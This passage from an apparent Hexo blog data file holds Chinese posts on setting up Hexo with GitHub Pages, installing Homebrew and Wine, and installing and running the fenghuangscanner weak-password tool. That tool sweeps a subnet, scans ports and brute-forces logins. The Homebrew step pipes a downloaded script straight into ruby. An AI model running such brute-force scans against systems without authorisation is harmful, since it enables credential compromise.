key”, 粘贴好公钥即可。\n\n如此, hexo depoly就可以用了。\n\n### 新建用于存放hexo博客源码的repo\nhexo deploy上传的只是生成的静态页面，博客的原始数据仍然存在于本地。为了安全起见，我们需要另外建一个库，用于博客源码。\n\n``` bash\n$ git init    # git本地目录初始化\n$ git remote add origin git@github.com:odboy/hexoBlog-src.git   # 配置远程git库\n$ git add .   \n$ git commit -m \"comment信息\"\n$ git status      # 查看分支情况\n$ git push -u origin master   # 推送到master分支\n```\n\n## 修改主题 -- [spfk](http://luuman.github.io/2015/12/27/Hexo/HexoTheme/)\n\n### 安装\n```\n$ cd ~/Documents/hexoBlog\n$ git clone https://github.com/luuman/hexo-theme-spfk.git themes/spfk\n$ cd themes/spfk\n$ git pull      # 主题update\n$ vim _config.yml\n--------------------\n      # Extensions\n      ## Plugins: https://hexo.io/plugins/\n      ## Themes: https://hexo.io/themes/\n      theme: spfk\n--------------------\n```\n### 插件配置\n","source":"_posts/hello-world.md","raw":"---\ntitle: The begin of blog\n---\n浑浑噩噩这么多年，一直没能养成写博客的习惯。如今是时候开始积累自己。\n这篇就算是一个开端，主要记录下hexo该如何使用。\n\n## 搭建hexo静态博客\nHexo官方文档 :: [https://hexo.io/zh-cn/docs](https://hexo.io/zh-cn/docs)\n### 安装\n\n``` bash\n$ wget -C https://nodejs.org/dist/v6.10.2/node-v6.10.2.pkg      # 下载Node.js安装包\n$ open node-v6.10.2.pkg      # 傻瓜式安装\n$ brew install git           # 安装git\n$ npm install -g hexo-cli    # 安全hexo\n$ hexo init <folder>         # 从hexo官网下载初始化文件\n$ cd <folder>                \n$ npm install                # 安装站点文件\n\n$ hexo server                # 启动服务器。默认情况下，访问网址为： http://localhost:4000/\n\n$ hexo new [layout] <title>  # 新建一个post\n$ hexo generate              # 生成静态文件\n```\n\n### 使用\n\n``` bash\n$ hexo new [layout] <title>    # layout默认为 post，可以在 _config.yml 的 default_layout 参数指定。\n                               # Hexo 有三种默认布局：post、page 和 draft。\n\n$ hexo new draft <title0>       # 新建一份草稿\n$ hexo publish [layout] <title0>   # 将draft移动到post\n$ hexo generate                 # 生成静态文件\n```\n\n### 部署\n\n``` bash\n$ npm install hexo-deployer-git --save      # 安装hexo-deployer-git以实现git部署\n\n$ vim _config.yml\n--------------[file content]\n    deploy:\n      type: git\n      repo: <repository url>    # 库（Repository）地址\n      branch: [branch]          # 分支名称。如果您使用的是 GitHub 或 GitCafe 的话，程序会尝试自动检测。\n      message: [message]        # 自定义提交信息 (默认为 Site updated: {{ now('YYYY-MM-DD HH:mm:ss') }})\n--------------[file content]\n$ hexo deploy     # 部署\n```\n\n## Github 配置\n### 新建用于存放pages的repo\n在GitHub上建一个repository（库），任意命名。\n如果是没有个人域名，最好以 [github账号].github.io 命名，后续这个二级域名便指向这个库的GitHub pages。\n如果有个人域名，可以任意命名，在setting中可以自行设置域名。然后将个人域名DNS解析指向GitHub.io的IP(192.30.252.153,192.30.252.154)。\n\n### 新建SSH Keys\n我使用SSH连接GitHub。 [官方文档](https://help.github.com/articles/connecting-to-github-with-ssh/)\n\n``` bash\n$ ls -al ~/.ssh     # 查看是否有 id_rsa 和 id_rsa.pub 文件\n# 如果不存在或者想要生成新的密钥对，可使用下面命令\n$ ssh-keygen -t rsa -b 4096 -C \"user@oddboy.cn\"\n$ pbcopy < ~/.ssh/id_rsa.pub    # 很强势的一个命令，将文件内容直接复制到剪贴板。\n```\n在GitHub的Personal setting --> SSH and GPG keys点击“New SSH key”, 粘贴好公钥即可。\n\n如此, hexo depoly就可以用了。\n\n### 新建用于存放hexo博客源码的repo\nhexo deploy上传的只是生成的静态页面，博客的原始数据仍然存在于本地。为了安全起见，我们需要另外建一个库，用于博客源码。\n\n``` bash\n$ git init    # git本地目录初始化\n$ git remote add origin git@github.com:odboy/hexoBlog-src.git   # 配置远程git库\n$ git add .   \n$ git commit -m \"comment信息\"\n$ git status      # 查看分支情况\n$ git push -u origin master   # 推送到master分支\n```\n\n## 修改主题 -- [spfk](http://luuman.github.io/2015/12/27/Hexo/HexoTheme/)\n\n### 安装\n```\n$ cd ~/Documents/hexoBlog\n$ git clone https://github.com/luuman/hexo-theme-spfk.git themes/spfk\n$ cd themes/spfk\n$ git pull      # 主题update\n$ vim _config.yml\n--------------------\n      # Extensions\n      ## Plugins: https://hexo.io/plugins/\n      ## Themes: https://hexo.io/themes/\n      theme: spfk\n--------------------\n```\n### 插件配置\n","slug":"hello-world","published":1,"date":"2017-04-06T12:39:17.000Z","updated":"2017-04-21T02:35:24.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cj3oafltm0006a8uvzc3o5f8t","content":"<p>浑浑噩噩这么多年，一直没能养成写博客的习惯。如今是时候开始积累自己。<br>这篇就算是一个开端，主要记录下hexo该如何使用。</p>\n<h2 id=\"搭建hexo静态博客\"><a href=\"#搭建hexo静态博客\" class=\"headerlink\" title=\"搭建hexo静态博客\"></a>搭建hexo静态博客</h2><p>Hexo官方文档 :: <a href=\"https://hexo.io/zh-cn/docs\" target=\"_blank\" rel=\"external\">https://hexo.io/zh-cn/docs</a></p>\n<h3 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div></pre></td><td class=\"code\"><pre><div class=\"line\">$ wget -C https://nodejs.org/dist/v6.10.2/node-v6.10.2.pkg      <span class=\"comment\"># 下载Node.js安装包</span></div><div class=\"line\">$ open node-v6.10.2.pkg      <span class=\"comment\"># 傻瓜式安装</span></div><div class=\"line\">$ brew install git           <span class=\"comment\"># 安装git</span></div><div class=\"line\">$ npm install -g hexo-cli    <span class=\"comment\"># 安全hexo</span></div><div class=\"line\">$ hexo init &lt;folder&gt;         <span class=\"comment\"># 从hexo官网下载初始化文件</span></div><div class=\"line\">$ <span class=\"built_in\">cd</span> &lt;folder&gt;                </div><div class=\"line\">$ npm install                <span class=\"comment\"># 安装站点文件</span></div><div class=\"line\"></div><div class=\"line\">$ hexo server                <span class=\"comment\"># 启动服务器。默认情况下，访问网址为： http://localhost:4000/</span></div><div class=\"line\"></div><div class=\"line\">$ hexo new [layout] &lt;title&gt;  <span class=\"comment\"># 新建一个post</span></div><div class=\"line\">$ hexo generate              <span class=\"comment\"># 生成静态文件</span></div></pre></td></tr></table></figure>\n<h3 id=\"使用\"><a href=\"#使用\" class=\"headerlink\" title=\"使用\"></a>使用</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\">$ hexo new [layout] &lt;title&gt;    <span class=\"comment\"># layout默认为 post，可以在 _config.yml 的 default_layout 参数指定。</span></div><div class=\"line\">                               <span class=\"comment\"># Hexo 有三种默认布局：post、page 和 draft。</span></div><div class=\"line\"></div><div class=\"line\">$ hexo new draft &lt;title0&gt;       <span class=\"comment\"># 新建一份草稿</span></div><div class=\"line\">$ hexo publish [layout] &lt;title0&gt;   <span class=\"comment\"># 将draft移动到post</span></div><div class=\"line\">$ hexo generate                 <span class=\"comment\"># 生成静态文件</span></div></pre></td></tr></table></figure>\n<h3 id=\"部署\"><a href=\"#部署\" class=\"headerlink\" title=\"部署\"></a>部署</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div></pre></td><td class=\"code\"><pre><div class=\"line\">$ npm install hexo-deployer-git --save      <span class=\"comment\"># 安装hexo-deployer-git以实现git部署</span></div><div class=\"line\"></div><div class=\"line\">$ vim _config.yml</div><div class=\"line\">--------------[file content]</div><div class=\"line\">    deploy:</div><div class=\"line\">      <span class=\"built_in\">type</span>: git</div><div class=\"line\">      repo: &lt;repository url&gt;    <span class=\"comment\"># 库（Repository）地址</span></div><div class=\"line\">      branch: [branch]          <span class=\"comment\"># 分支名称。如果您使用的是 GitHub 或 GitCafe 的话，程序会尝试自动检测。</span></div><div class=\"line\">      message: [message]        <span class=\"comment\"># 自定义提交信息 (默认为 Site updated: &#123;&#123; now('YYYY-MM-DD HH:mm:ss') &#125;&#125;)</span></div><div class=\"line\">--------------[file content]</div><div class=\"line\">$ hexo deploy     <span class=\"comment\"># 部署</span></div></pre></td></tr></table></figure>\n<h2 id=\"Github-配置\"><a href=\"#Github-配置\" class=\"headerlink\" title=\"Github 配置\"></a>Github 配置</h2><h3 id=\"新建用于存放pages的repo\"><a href=\"#新建用于存放pages的repo\" class=\"headerlink\" title=\"新建用于存放pages的repo\"></a>新建用于存放pages的repo</h3><p>在GitHub上建一个repository（库），任意命名。<br>如果是没有个人域名，最好以 [github账号].github.io 命名，后续这个二级域名便指向这个库的GitHub pages。<br>如果有个人域名，可以任意命名，在setting中可以自行设置域名。然后将个人域名DNS解析指向GitHub.io的IP(192.30.252.153,192.30.252.154)。</p>\n<h3 id=\"新建SSH-Keys\"><a href=\"#新建SSH-Keys\" class=\"headerlink\" title=\"新建SSH Keys\"></a>新建SSH Keys</h3><p>我使用SSH连接GitHub。 <a href=\"https://help.github.com/articles/connecting-to-github-with-ssh/\" target=\"_blank\" rel=\"external\">官方文档</a></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">$ ls -al ~/.ssh     <span class=\"comment\"># 查看是否有 id_rsa 和 id_rsa.pub 文件</span></div><div class=\"line\"><span class=\"comment\"># 如果不存在或者想要生成新的密钥对，可使用下面命令</span></div><div class=\"line\">$ ssh-keygen -t rsa -b 4096 -C <span class=\"string\">\"user@oddboy.cn\"</span></div><div class=\"line\">$ pbcopy &lt; ~/.ssh/id_rsa.pub    <span class=\"comment\"># 很强势的一个命令，将文件内容直接复制到剪贴板。</span></div></pre></td></tr></table></figure>\n<p>在GitHub的Personal setting –&gt; SSH and GPG keys点击“New SSH key”, 粘贴好公钥即可。</p>\n<p>如此, hexo depoly就可以用了。</p>\n<h3 id=\"新建用于存放hexo博客源码的repo\"><a href=\"#新建用于存放hexo博客源码的repo\" class=\"headerlink\" title=\"新建用于存放hexo博客源码的repo\"></a>新建用于存放hexo博客源码的repo</h3><p>hexo deploy上传的只是生成的静态页面，博客的原始数据仍然存在于本地。为了安全起见，我们需要另外建一个库，用于博客源码。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\">$ git init    <span class=\"comment\"># git本地目录初始化</span></div><div class=\"line\">$ git remote add origin git@github.com:odboy/hexoB<span class=\"built_in\">log</span>-src.git   <span class=\"comment\"># 配置远程git库</span></div><div class=\"line\">$ git add .   </div><div class=\"line\">$ git commit -m <span class=\"string\">\"comment信息\"</span></div><div class=\"line\">$ git status      <span class=\"comment\"># 查看分支情况</span></div><div class=\"line\">$ git push -u origin master   <span class=\"comment\"># 推送到master分支</span></div></pre></td></tr></table></figure>\n<h2 id=\"修改主题-–-spfk\"><a href=\"#修改主题-–-spfk\" class=\"headerlink\" title=\"修改主题 – spfk\"></a>修改主题 – <a href=\"http://luuman.github.io/2015/12/27/Hexo/HexoTheme/\" target=\"_blank\" rel=\"external\">spfk</a></h2><h3 id=\"安装-1\"><a href=\"#安装-1\" class=\"headerlink\" title=\"安装\"></a>安装</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div></pre></td><td class=\"code\"><pre><div class=\"line\">$ cd ~/Documents/hexoBlog</div><div class=\"line\">$ git clone https://github.com/luuman/hexo-theme-spfk.git themes/spfk</div><div class=\"line\">$ cd themes/spfk</div><div class=\"line\">$ git pull      # 主题update</div><div class=\"line\">$ vim _config.yml</div><div class=\"line\">--------------------</div><div class=\"line\">      # Extensions</div><div class=\"line\">      ## Plugins: https://hexo.io/plugins/</div><div class=\"line\">      ## Themes: https://hexo.io/themes/</div><div class=\"line\">      theme: spfk</div><div class=\"line\">--------------------</div></pre></td></tr></table></figure>\n<h3 id=\"插件配置\"><a href=\"#插件配置\" class=\"headerlink\" title=\"插件配置\"></a>插件配置</h3>","site":{"data":{}},"excerpt":"","more":"<p>浑浑噩噩这么多年，一直没能养成写博客的习惯。如今是时候开始积累自己。<br>这篇就算是一个开端，主要记录下hexo该如何使用。</p>\n<h2 id=\"搭建hexo静态博客\"><a href=\"#搭建hexo静态博客\" class=\"headerlink\" title=\"搭建hexo静态博客\"></a>搭建hexo静态博客</h2><p>Hexo官方文档 :: <a href=\"https://hexo.io/zh-cn/docs\">https://hexo.io/zh-cn/docs</a></p>\n<h3 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div></pre></td><td class=\"code\"><pre><div class=\"line\">$ wget -C https://nodejs.org/dist/v6.10.2/node-v6.10.2.pkg      <span class=\"comment\"># 下载Node.js安装包</span></div><div class=\"line\">$ open node-v6.10.2.pkg      <span class=\"comment\"># 傻瓜式安装</span></div><div class=\"line\">$ brew install git           <span class=\"comment\"># 安装git</span></div><div class=\"line\">$ npm install -g hexo-cli    <span class=\"comment\"># 安全hexo</span></div><div class=\"line\">$ hexo init &lt;folder&gt;         <span class=\"comment\"># 从hexo官网下载初始化文件</span></div><div class=\"line\">$ <span class=\"built_in\">cd</span> &lt;folder&gt;                </div><div class=\"line\">$ npm install                <span class=\"comment\"># 安装站点文件</span></div><div class=\"line\"></div><div class=\"line\">$ hexo server                <span class=\"comment\"># 启动服务器。默认情况下，访问网址为： http://localhost:4000/</span></div><div class=\"line\"></div><div class=\"line\">$ hexo new [layout] &lt;title&gt;  <span class=\"comment\"># 新建一个post</span></div><div class=\"line\">$ hexo generate              <span class=\"comment\"># 生成静态文件</span></div></pre></td></tr></table></figure>\n<h3 id=\"使用\"><a href=\"#使用\" class=\"headerlink\" title=\"使用\"></a>使用</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\">$ hexo new [layout] &lt;title&gt;    <span class=\"comment\"># layout默认为 post，可以在 _config.yml 的 default_layout 参数指定。</span></div><div class=\"line\">                               <span class=\"comment\"># Hexo 有三种默认布局：post、page 和 draft。</span></div><div class=\"line\"></div><div class=\"line\">$ hexo new draft &lt;title0&gt;       <span class=\"comment\"># 新建一份草稿</span></div><div class=\"line\">$ hexo publish [layout] &lt;title0&gt;   <span class=\"comment\"># 将draft移动到post</span></div><div class=\"line\">$ hexo generate                 <span class=\"comment\"># 生成静态文件</span></div></pre></td></tr></table></figure>\n<h3 id=\"部署\"><a href=\"#部署\" class=\"headerlink\" title=\"部署\"></a>部署</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div></pre></td><td class=\"code\"><pre><div class=\"line\">$ npm install hexo-deployer-git --save      <span class=\"comment\"># 安装hexo-deployer-git以实现git部署</span></div><div class=\"line\"></div><div class=\"line\">$ vim _config.yml</div><div class=\"line\">--------------[file content]</div><div class=\"line\">    deploy:</div><div class=\"line\">      <span class=\"built_in\">type</span>: git</div><div class=\"line\">      repo: &lt;repository url&gt;    <span class=\"comment\"># 库（Repository）地址</span></div><div class=\"line\">      branch: [branch]          <span class=\"comment\"># 分支名称。如果您使用的是 GitHub 或 GitCafe 的话，程序会尝试自动检测。</span></div><div class=\"line\">      message: [message]        <span class=\"comment\"># 自定义提交信息 (默认为 Site updated: &#123;&#123; now('YYYY-MM-DD HH:mm:ss') &#125;&#125;)</span></div><div class=\"line\">--------------[file content]</div><div class=\"line\">$ hexo deploy     <span class=\"comment\"># 部署</span></div></pre></td></tr></table></figure>\n<h2 id=\"Github-配置\"><a href=\"#Github-配置\" class=\"headerlink\" title=\"Github 配置\"></a>Github 配置</h2><h3 id=\"新建用于存放pages的repo\"><a href=\"#新建用于存放pages的repo\" class=\"headerlink\" title=\"新建用于存放pages的repo\"></a>新建用于存放pages的repo</h3><p>在GitHub上建一个repository（库），任意命名。<br>如果是没有个人域名，最好以 [github账号].github.io 命名，后续这个二级域名便指向这个库的GitHub pages。<br>如果有个人域名，可以任意命名，在setting中可以自行设置域名。然后将个人域名DNS解析指向GitHub.io的IP(192.30.252.153,192.30.252.154)。</p>\n<h3 id=\"新建SSH-Keys\"><a href=\"#新建SSH-Keys\" class=\"headerlink\" title=\"新建SSH Keys\"></a>新建SSH Keys</h3><p>我使用SSH连接GitHub。 <a href=\"https://help.github.com/articles/connecting-to-github-with-ssh/\">官方文档</a></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">$ ls -al ~/.ssh     <span class=\"comment\"># 查看是否有 id_rsa 和 id_rsa.pub 文件</span></div><div class=\"line\"><span class=\"comment\"># 如果不存在或者想要生成新的密钥对，可使用下面命令</span></div><div class=\"line\">$ ssh-keygen -t rsa -b 4096 -C <span class=\"string\">\"user@oddboy.cn\"</span></div><div class=\"line\">$ pbcopy &lt; ~/.ssh/id_rsa.pub    <span class=\"comment\"># 很强势的一个命令，将文件内容直接复制到剪贴板。</span></div></pre></td></tr></table></figure>\n<p>在GitHub的Personal setting –&gt; SSH and GPG keys点击“New SSH key”, 粘贴好公钥即可。</p>\n<p>如此, hexo depoly就可以用了。</p>\n<h3 id=\"新建用于存放hexo博客源码的repo\"><a href=\"#新建用于存放hexo博客源码的repo\" class=\"headerlink\" title=\"新建用于存放hexo博客源码的repo\"></a>新建用于存放hexo博客源码的repo</h3><p>hexo deploy上传的只是生成的静态页面，博客的原始数据仍然存在于本地。为了安全起见，我们需要另外建一个库，用于博客源码。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\">$ git init    <span class=\"comment\"># git本地目录初始化</span></div><div class=\"line\">$ git remote add origin git@github.com:odboy/hexoB<span class=\"built_in\">log</span>-src.git   <span class=\"comment\"># 配置远程git库</span></div><div class=\"line\">$ git add .   </div><div class=\"line\">$ git commit -m <span class=\"string\">\"comment信息\"</span></div><div class=\"line\">$ git status      <span class=\"comment\"># 查看分支情况</span></div><div class=\"line\">$ git push -u origin master   <span class=\"comment\"># 推送到master分支</span></div></pre></td></tr></table></figure>\n<h2 id=\"修改主题-–-spfk\"><a href=\"#修改主题-–-spfk\" class=\"headerlink\" title=\"修改主题 – spfk\"></a>修改主题 – <a href=\"http://luuman.github.io/2015/12/27/Hexo/HexoTheme/\">spfk</a></h2><h3 id=\"安装-1\"><a href=\"#安装-1\" class=\"headerlink\" title=\"安装\"></a>安装</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div></pre></td><td class=\"code\"><pre><div class=\"line\">$ cd ~/Documents/hexoBlog</div><div class=\"line\">$ git clone https://github.com/luuman/hexo-theme-spfk.git themes/spfk</div><div class=\"line\">$ cd themes/spfk</div><div class=\"line\">$ git pull      # 主题update</div><div class=\"line\">$ vim _config.yml</div><div class=\"line\">--------------------</div><div class=\"line\">      # Extensions</div><div class=\"line\">      ## Plugins: https://hexo.io/plugins/</div><div class=\"line\">      ## Themes: https://hexo.io/themes/</div><div class=\"line\">      theme: spfk</div><div class=\"line\">--------------------</div></pre></td></tr></table></figure>\n<h3 id=\"插件配置\"><a href=\"#插件配置\" class=\"headerlink\" title=\"插件配置\"></a>插件配置</h3>"},{"title":"install homebrew and wine on mac","date":"2017-05-16T06:02:17.000Z","_content":"\n## wine安装\n```bash\n# 安装homebrew\n/usr/bin/ruby -e \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)\"\n\n# 安装wine\nbrew install wine\n# 会提示wine: XQuartz is required to install this formula.X11Requirement unsatisfied!\n# 按照提示信息到https://xquartz.macosforge.org下载xquartz或者直接运行：\nbrew cask install xquartz\n\n# 安装成功后，再次：\nbrew install wine\n\n# 检查wine 安装状态\nwine --version\n\n# 使用wine打开exe程序\nwine winfile.exe\n```\nbrew cask :: [http://caskroom.github.io](http://caskroom.github.io)\n\nXQuartz :: [https://www.xquartz.org](https://www.xquartz.org)","source":"_posts/install-homebrew-and-wine-on-mac.md","raw":"---\ntitle: install homebrew and wine on mac\ndate: 2017-05-16 14:02:17\ntags:\n---\n\n## wine安装\n```bash\n# 安装homebrew\n/usr/bin/ruby -e \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)\"\n\n# 安装wine\nbrew install wine\n# 会提示wine: XQuartz is required to install this formula.X11Requirement unsatisfied!\n# 按照提示信息到https://xquartz.macosforge.org下载xquartz或者直接运行：\nbrew cask install xquartz\n\n# 安装成功后，再次：\nbrew install wine\n\n# 检查wine 安装状态\nwine --version\n\n# 使用wine打开exe程序\nwine winfile.exe\n```\nbrew cask :: [http://caskroom.github.io](http://caskroom.github.io)\n\nXQuartz :: [https://www.xquartz.org](https://www.xquartz.org)","slug":"install-homebrew-and-wine-on-mac","published":1,"updated":"2017-05-16T06:02:50.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cj3oafltn0007a8uvgel00gfn","content":"<h2 id=\"wine安装\"><a href=\"#wine安装\" class=\"headerlink\" title=\"wine安装\"></a>wine安装</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\"># 安装homebrew</span></div><div class=\"line\">/usr/bin/ruby <span class=\"_\">-e</span> <span class=\"string\">\"<span class=\"variable\">$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)</span>\"</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># 安装wine</span></div><div class=\"line\">brew install wine</div><div class=\"line\"><span class=\"comment\"># 会提示wine: XQuartz is required to install this formula.X11Requirement unsatisfied!</span></div><div class=\"line\"><span class=\"comment\"># 按照提示信息到https://xquartz.macosforge.org下载xquartz或者直接运行：</span></div><div class=\"line\">brew cask install xquartz</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># 安装成功后，再次：</span></div><div class=\"line\">brew install wine</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># 检查wine 安装状态</span></div><div class=\"line\">wine --version</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># 使用wine打开exe程序</span></div><div class=\"line\">wine winfile.exe</div></pre></td></tr></table></figure>\n<p>brew cask :: <a href=\"http://caskroom.github.io\" target=\"_blank\" rel=\"external\">http://caskroom.github.io</a></p>\n<p>XQuartz :: <a href=\"https://www.xquartz.org\" target=\"_blank\" rel=\"external\">https://www.xquartz.org</a></p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"wine安装\"><a href=\"#wine安装\" class=\"headerlink\" title=\"wine安装\"></a>wine安装</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\"># 安装homebrew</span></div><div class=\"line\">/usr/bin/ruby <span class=\"_\">-e</span> <span class=\"string\">\"<span class=\"variable\">$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)</span>\"</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># 安装wine</span></div><div class=\"line\">brew install wine</div><div class=\"line\"><span class=\"comment\"># 会提示wine: XQuartz is required to install this formula.X11Requirement unsatisfied!</span></div><div class=\"line\"><span class=\"comment\"># 按照提示信息到https://xquartz.macosforge.org下载xquartz或者直接运行：</span></div><div class=\"line\">brew cask install xquartz</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># 安装成功后，再次：</span></div><div class=\"line\">brew install wine</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># 检查wine 安装状态</span></div><div class=\"line\">wine --version</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># 使用wine打开exe程序</span></div><div class=\"line\">wine winfile.exe</div></pre></td></tr></table></figure>\n<p>brew cask :: <a href=\"http://caskroom.github.io\">http://caskroom.github.io</a></p>\n<p>XQuartz :: <a href=\"https://www.xquartz.org\">https://www.xquartz.org</a></p>\n"},{"title":"弱口令检测工具fenghuangscanner的安装与使用","date":"2017-05-16T13:38:53.000Z","_content":"### 下载地址 : [https://github.com/wilson9x1/fenghuangscanner](https://github.com/wilson9x1/fenghuangscanner)\n\n```bash\ncd fenghuangscanner\npip install -r requirements.txt         # 安装依赖包\npython fenghuangscanner.py -h           # 运行\n\n# 在安装依赖包的过程中可能会报错。  主要是pymssql这个包\nbrew install freetds\npip install cython\n\n# 如果仍然不行，\b\b使用下面命令安装最新的pymssql\npip install git+https://github.com/pymssql/pymssql.git\n\n# Because 2.2.0 still hasn't made it to PyPI as of this comment, the following command from @bkanuka still works and installed smoothly without a single error:\n# pip install git+https://github.com/pymssql/pymssql.git\n```\n\n问题参考   [https://github.com/Homebrew/homebrew-python/issues/338](https://github.com/Homebrew/homebrew-python/issues/338)\n\n### 使用\n```bash\npython fenghuangscan.py --ip 192.168.199.0/24\n```\n主机存活扫描 --> 端口扫描 --> 弱口令爆破","source":"_posts/弱口令检测工具fenghuangscanner的安装与使用.md","raw":"---\ntitle: 弱口令检测工具fenghuangscanner的安装与使用\ndate: 2017-05-16 21:38:53\ntags:\n---\n### 下载地址 : [https://github.com/wilson9x1/fenghuangscanner](https://github.com/wilson9x1/fenghuangscanner)\n\n```bash\ncd fenghuangscanner\npip install -r requirements.txt         # 安装依赖包\npython fenghuangscanner.py -h           # 运行\n\n# 在安装依赖包的过程中可能会报错。  主要是pymssql这个包\nbrew install freetds\npip install cython\n\n# 如果仍然不行，\b\b使用下面命令安装最新的pymssql\npip install git+https://github.com/pymssql/pymssql.git\n\n# Because 2.2.0 still hasn't made it to PyPI as of this comment, the following command from @bkanuka still works and installed smoothly without a single error:\n# pip install git+https://github.com/pymssql/pymssql.git\n```\n\n问题参考   [https://github.com/Homebrew/homebrew-python/issues/338](https://github.com/Homebrew/homebrew-python/issues/338)\n\n### 使用\n```bash\npython fenghuangscan.py --ip 192.168.199.0/24\n```\n主机存活扫描 --> 端口扫描 --> 弱口令爆破","slug":"弱口令检测工具fenghuangscanner的安装与使用","published":1,"updated":"2017-05-16T14:00:41.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cj3oafltp0008a8uv3ort0on9","content":"<h3 id=\"下载地址-https-github-com-wilson9x1-fenghuangscanner\"><a href=\"#下载地址-https-github-com-wilson9x1-fenghuangscanner\" class=\"headerlink\" title=\"下载地址 : https://github.com/wilson9x1/fenghuangscanner\"></a>下载地址 : <a href=\"https://github.com/wilson9x1/fenghuangscanner\" target=\"_blank\" rel=\"external\">https://github.com/wilson9x1/fenghuangscanner</a></h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div 